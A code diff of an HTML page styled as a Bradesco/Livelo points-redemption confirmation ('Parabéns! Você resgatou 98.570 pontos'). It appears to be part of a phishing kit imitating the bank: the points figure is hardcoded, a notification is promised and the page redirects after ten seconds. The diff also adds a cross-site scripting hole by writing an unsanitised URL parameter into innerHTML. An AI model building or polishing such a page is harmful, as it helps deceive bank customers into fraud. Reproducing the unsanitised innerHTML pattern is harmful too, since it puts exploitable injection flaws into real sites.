@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bradesco · Livelo · Resgate</title>
+    <title>Parabéns · Bradesco Livelo</title>
     <style>
         * {
             margin: 0;
@@ -51,29 +51,40 @@
 
         .titulo {
             color: #C62828;
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: 700;
             margin-bottom: 20px;
         }
 
-        .pontos {
+        .pontos-box {
             background: #f5f5f5;
-            padding: 20px;
+            padding: 25px;
             border-radius: 20px;
             margin: 25px 0;
         }
 
-        .pontos .valor {
-            font-size: 2.5rem;
+        .pontos-label {
+            font-size: 1.1rem;
+            color: #666;
+        }
+
+        .pontos-valor {
+            font-size: 3rem;
             font-weight: 800;
             color: #C62828;
+            margin: 10px 0;
+        }
+
+        .pontos-texto {
+            font-size: 1.2rem;
+            color: #333;
         }
 
         .mensagem {
             color: #333;
             font-size: 1.2rem;
             line-height: 1.6;
-            margin: 20px 0;
+            margin: 25px 0;
         }
 
         .notificacao {
@@ -82,7 +93,7 @@
             padding: 15px;
             border-radius: 50px;
             font-weight: 600;
-            margin: 20px 0;
+            margin: 25px 0;
         }
 
         .loader {
@@ -92,7 +103,7 @@
             border-top: 5px solid #C62828;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 25px auto;
         }
 
         @keyframes spin {
@@ -100,7 +111,7 @@
             100% { transform: rotate(360deg); }
         }
 
-        .btn-home {
+        .btn-voltar {
             background: #C62828;
             color: white;
             border: none;
@@ -112,10 +123,18 @@
             margin-top: 20px;
             text-decoration: none;
             display: inline-block;
+            transition: 0.2s;
         }
 
-        .btn-home:hover {
+        .btn-voltar:hover {
             background: #8B0000;
+            transform: scale(1.05);
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: rgba(255,255,255,0.7);
+            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -127,12 +146,12 @@
                 <img src="logolivelo.png" alt="Livelo">
             </div>
             
-            <div class="titulo">Parabéns!</div>
+            <div class="titulo">Parabéns! 🎉</div>
             
-            <div class="pontos">
-                <div>Você resgatou</div>
-                <div class="valor" id="pontosResgatados">98.570</div>
-                <div>pontos Livelo</div>
+            <div class="pontos-box">
+                <div class="pontos-label">Você resgatou</div>
+                <div class="pontos-valor" id="pontos">98.570</div>
+                <div class="pontos-texto">pontos Livelo</div>
             </div>
             
             <div class="mensagem">
@@ -140,27 +159,25 @@
                 Você será notificado em breve.
             </div>
             
-            <div class="notificacao">
+            <div class="notificacao" id="notificacao">
                 🔔 Notificação será enviada por e-mail e SMS
             </div>
             
             <div class="loader"></div>
             
-            <a href="/" class="btn-home">Voltar ao início</a>
+            <a href="/" class="btn-voltar">Voltar ao início</a>
+        </div>
+        
+        <div class="footer">
+            Bradesco · Livelo · Resgate de Pontos
         </div>
     </div>
 
     <script>
-        // Pega os pontos da URL ou localStorage
-        const urlParams = new URLSearchParams(window.location.search);
-        let pontos = urlParams.get('pontos') || localStorage.getItem('ultimosPontos') || '98.570';
-        
-        document.getElementById('pontosResgatados').textContent = pontos;
-        
-        // Redireciona após 10 segundos (opcional)
-        setTimeout(() => {
-            window.location.href = '/';
-        }, 10000);
+        const params = new URLSearchParams(window.location.search);
+        document.getElementById('pontos').textContent = params.get('pontos') || '98.570';
+        document.getElementById('notificacao').innerHTML = `🔔 Notificação será enviada por ${params.get('notificacao') || 'e-mail e SMS'}`;
+        setTimeout(() => window.location.href = '/', 10000);
     </script>
 </body>
 </html>
